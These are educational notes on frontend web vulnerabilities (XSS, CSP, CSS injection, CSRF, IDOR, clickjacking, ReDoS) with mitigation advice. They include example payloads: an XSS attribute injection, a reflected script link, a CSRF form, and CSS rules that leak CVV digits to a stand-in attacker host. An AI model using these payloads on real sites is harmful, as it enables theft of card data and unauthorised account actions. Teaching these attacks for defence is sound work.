# Vulnerabilities

## Consequence of vulnerable code (on frontend)

### Broken UI

**Example:** user can't click the 'pay' button => service losses money.

### Tracking of users activity

**Example:** hacker may find out what sites user visits and what is trying to find.
Confidential infotmation can be compromosied.

### Slowing down client app work

**Example:** slow information updates (money courses in bank, for example) may lead to financial loss.

### Lose of confidential data

**Example:** loss of email and password or controll over the site (via lose of authentication info like cookie) can lead
to a loss of client's data, client's money, and just loss of client.

## XSS (Cross-Site Scripting) attack

It's an injection of a malicious code into client's code - the one executed in browser (js, html, css).

## Examples

**Example of Stored-XSS (malicious code comes from server->database):**
```html
<ul id="comments"></ul>

<script>
    // load comments from server and insert it to html
    fetch('/comments')
            .then(res => res.json())
            .then(addComments)
    
    function addComments(comments) {
        document.getElementById('comments').innerHTML = commentsToHTML(comments)
    }
    
    function commentsToHTML(comments) {
        return comments.map(commentTemplateMaker).join('')
    }

    function commentTemplateMaker({imgUrl, text}) {
        return `
            <li>
                <img src="${imgUrl}"/>
                <p>${text}}</p>
            </li>
        `
    }
</script>
```
If the result on fetch request will be something like
```json
[
  {
    "imgUrl": "/avatar.png\" onload='alert(1)' onerror='console.log(`ATTACK`)'",
    "text": "some comment"
  }
]
```
then in markup will get an executive js code (once img is loaded/fail on load), like
```html
<li>
    <img src="/avatar.png" onload="alert(1)" onerror="console.log(`ATTACK`)">
    <p>some comment</p>
</li>
```
**Example of Reflected-XSS (caused by a not safe data handling on the server):**
```html
<a href="http://site.com?page=1&search=&lt;script&gt;alert(1)&lt;/script&gt;">
  click me!
</a>
```
If data from url (`search=&lt;script&gt;alert(1)&lt;/script&gt;`) is reflected to a html (via echo in php for example), then in html on `http://site.com` user may get:
```html
<script>alert(1)</script>
```

### How to deal with XSS

To prevent XSS attacks, the one should:
* Use sanitization of content on client: for example [DOM Purify](https://www.npmjs.com/package/dompurify)
* Use sanitization on the server
* Use Content Security Policy headers

### Content Security Policy (CSP)

CSP can be set via headers in HTTP response, or via meta tags in html:
```html
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'none';
    script-src 'self';
    connect-src 'self' https://*.friendly-site.com;
    style-src 'self';
    img-src 'self' too.friendly.com;
  "
/>
```
CSP - it's a "white list" of what can be used on the page as a source of some content. More info is [about CSP](https://www.w3.org/TR/CSP3/#csp-directives).

## CSS injection
Some confidential data can be stolen if malcious code is injected in css.  
Let's imagine that user wants to make a payment on some site via bank card, and to do this user should
enter CVV code (3 digits on back of the card). If attacker has access to a css file, used on payment page, then it's possible
to steal cvv info like this:
```css
#input[value^='0'] { background-image: url('http://hackerman.com?value=%10');}
#input[value^='1'] { background-image: url('http://hackerman.com?value=%11');}
#input[value^='2'] { background-image: url('http://hackerman.com?value=%12');}
#input[value^='3'] { background-image: url('http://hackerman.com?value=%13');}
#input[value^='4'] { background-image: url('http://hackerman.com?value=%14');}
#input[value^='5'] { background-image: url('http://hackerman.com?value=%15');}
#input[value^='6'] { background-image: url('http://hackerman.com?value=%16');}
#input[value^='7'] { background-image: url('http://hackerman.com?value=%17');}
#input[value^='8'] { background-image: url('http://hackerman.com?value=%18');}
#input[value^='9'] { background-image: url('http://hackerman.com?value=%19');}
```
`#input` - selector of an input for a cvv code  
So hacker may fix request on hacker's site depending on what digit user is entering (because requests are made in css for a background-image).  
Usage of CSP can help to deal with it.

## CSRF (Cross Site Request Forgery)
That attack is based on passing cookie when executing request.  
For example `attacker.com` has a form like
```html
<form action="http://bank.com/remove_account">
    <input type="email"/>
</form>
```
if `http://bank.com/remove_account` is an endpoint that allowes to remove an account of a looged in user, 
and if user authentication info is kept in session cookie, then submitting such a form (on a hacker site `attacker.com`) 
can lead to an account removal, because with a request to a `http://bank.com/remove_account` authentication cookie will be sent,
and for a server it will look like a user triggere that action (account removal).

There are several ways to [prevent CSRF attacks](https://habr.com/ru/company/oleg-bunin/blog/412855/).

## Vulnerable & outdated components
Malware can be present in third-party libs.

## Unvalidated redirects & forwards

## IDOR (Insecure Direct Object References)
**Example:**
`http://example.come/?user=18` - link to a users private profile page  
If changing `user=18` to user `user=19` gives access to a profile of user with id=19 - it's IDOR vulnerability.


## Prototype Polution

## Clickjacking

Usage of a transparent iframe of one site (where user may be logged in for example) over another site (part of site of a hacker).

## ReDos (Regular expressions denial of service)

Time of regular expressions executions can be many seconds/hours and more, depending on regular expression and text. 


## References
* [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
* [https://habr.com/ru/company/simbirsoft/blog/659847/](https://habr.com/ru/company/simbirsoft/blog/659847/)
* [https://www.geeksforgeeks.org/reflected-xss-vulnerability-in-depth/](https://www.geeksforgeeks.org/reflected-xss-vulnerability-in-depth/)
* [https://habr.com/ru/company/oleg-bunin/blog/412855/](https://habr.com/ru/company/oleg-bunin/blog/412855/)
